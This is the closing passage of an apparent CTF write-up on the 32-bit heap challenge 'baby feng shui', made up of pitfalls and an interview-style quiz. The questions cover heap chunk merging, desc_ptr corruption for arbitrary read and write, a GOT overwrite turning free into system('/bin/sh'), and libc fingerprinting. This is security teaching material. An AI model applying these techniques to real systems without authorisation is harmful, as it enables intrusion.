   ASLR, but more importantly, a brand-new process from a possibly
   different image), not bugs in the exploit. **Pin down your target and
   keep a log of exactly which instance produced which result.**

6. **Giving up on hash-based identification too early.** An empty result
   from a hash database is informative (crawler gap) but not a dead end —
   the binary itself usually tells you what it is, if you ask it directly
   (`strings` for the version banner) instead of only asking a third party.

---

## 10. Interview-Style Quiz

A set of questions in roughly increasing difficulty — useful for mock
interviews or for testing whether you actually internalized this write-up
rather than just reading it.

### Warm-up

1. Why does *Partial* RELRO (as opposed to Full RELRO) make a GOT-overwrite
   attack possible?
2. This binary has NX enabled and a stack canary. Why does that push an
   attacker toward a *heap*-based bug instead of a classic stack smash?
3. What's the practical difference, for an attacker, between No PIE and a
   PIE binary with a known libc leak?

### Core mechanics

4. The vulnerable bounds check compares `desc_ptr + size` against
   `struct_ptr - 4`. Explain in one sentence why this check is meaningless,
   and what a *correct* check would need to track that this program never
   stores.
5. Why does `malloc(8)` followed by `malloc(0x80)` *not* guarantee the two
   resulting chunks are adjacent in every glibc version? What changed
   between glibc < 2.26 and glibc ≥ 2.26 that affects this?
6. In the exploit, two users are created with `dlen = 0x80` on purpose.
   What specific behavior of `free()` does this trigger, and why does it
   matter that `0x80` matches the struct's own allocation size rather than
   some other size?
7. What are the `p32(0x88 + 1)` fields in the payload actually for? What
   would likely happen if you just filled that entire region with `'A'`
   bytes instead?
8. Why is `display_user`'s `printf("description: %s", u->desc_ptr)` an
   "arbitrary read," and `update_description`'s `fgets(desc_ptr, ...)` an
   "arbitrary write," once `desc_ptr` has been corrupted? What do both
   primitives have in common structurally?

### Exploit chain & libc

9. Explain, step by step, why `free(idx2->desc_ptr)` becomes
   `system("/bin/sh")` after the GOT overwrite. What two independent
   conditions both have to be true at that exact moment for this to work?
10. Why does leaking a single function's address from a 32-bit, no-PIE
    process only reveal the libc base, and not the base of the executable
    itself? (Hint: think about what's randomized vs. what's fixed.)
11. A `libc.rip` query for one leaked symbol returns 10 candidates across
    three different CPU architectures. What does this tell you about how
    that matching works internally, and why is a single-symbol match
    weak evidence?
12. You leak two different symbols from two *separate* TCP connections to
    the same service (so each leak has a different, independently
    randomized libc base). Explain why you *cannot* algebraically combine
    the two absolute leaked addresses to compute one libc base, but you
    *can* still use both leaks together to narrow down the libc version.
13. A hash-based libc database (matching by SHA256/BuildID) returns zero
    results for a real, legitimate libc file. Give two completely different,
    valid explanations for this (one benign, one that should worry you),
    and describe one concrete step you'd take to distinguish between them.
14. Where, physically, inside a compiled glibc shared object does the
    human-readable version banner string (e.g. `"GNU C Library (Ubuntu
    GLIBC 2.23-0ubuntu11)..."`) come from, and why is it more trustworthy
    as a version fingerprint than a crowd-sourced hash database entry?

### Static analysis methodology

14b. In a non-PIE 32-bit ELF, why does `strings -a -t x` (which prints file
     *offsets*) give you, after one addition, the exact runtime address of
     every string — and why does that trick stop working the moment PIE is
     enabled?
14c. Looking at the two `printf` call sites inside `display_user`, one
     pushes `&users[index]->name` (an address) and the other pushes
     `*users[index]` i.e. `users[index]->desc_ptr` (a dereferenced value).
     What's the one extra instruction that distinguishes "pass an address"
     from "pass a value" in x86 disassembly, and why does spotting it matter
     so much here?
14d. The bug in `update_description` takes exactly six x86 instructions to
     see once you know what's in each register at each point (Section 2.1,
     Step 4). Without a decompiler, what manual technique lets you figure
     out what a register holds at an arbitrary instruction, just from
     reading disassembly top-down?
14e. `add_user`'s tail calls into the *same* address as menu option 3's
     handler. What specific instruction pattern tipped this off, and why
     would reverse-engineering `add_user` and `update_description` as two
     unrelated functions have led you to a wrong mental model of the
     program's behavior?

### Debugging & methodology

15. You observe a leak that returns 16 bytes instead of the 4 you expected,
    with no `0x00` byte anywhere in the first 16 bytes. Walk through the
    two competing explanations ("the overflow landed in the wrong place"
    vs. "the string just kept reading past the field you wanted") and
    explain exactly which raw evidence lets you tell them apart.
16. Suppose your exploit works perfectly against one instance of a
    challenge but a nearly-identical script fails against what you believe
    is "the same" challenge five minutes later. List three different root
    causes this could have, ordered from most to least likely in a typical
    CTF-as-a-service deployment.

### Bonus / open-ended

17. This challenge's name is "**baby feng shui**." After working through
    this write-up, explain in your own words what "feng shui" means in the
    context of heap exploitation, and why "baby" is an apt description of
    this particular technique relative to more advanced heap attacks (e.g.
    tcache poisoning, House of Orange, unlink exploitation).
18. If this exact binary were recompiled today against a *current* glibc
    (with tcache, safe-linking, and additional hardening), would the
    `0x80`/`0x80` merge-then-reclaim trick still work unmodified? What
    would you need to change, and why?

---


